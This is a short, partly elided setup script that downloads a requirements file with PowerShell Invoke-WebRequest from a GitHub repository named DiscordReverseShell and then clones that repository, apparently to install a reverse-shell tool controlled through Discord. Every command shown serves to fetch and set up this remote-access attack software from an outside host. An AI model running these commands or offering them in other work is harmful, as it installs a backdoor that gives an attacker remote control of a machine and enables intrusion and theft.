...
powershell.exe -Command "& {Invoke-WebRequest -Uri https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/requirements.txt -OutFile requirements.txt}"
...
git clone https://github.com/Josakko/DiscordReverseShell.git
echo Setup complete!
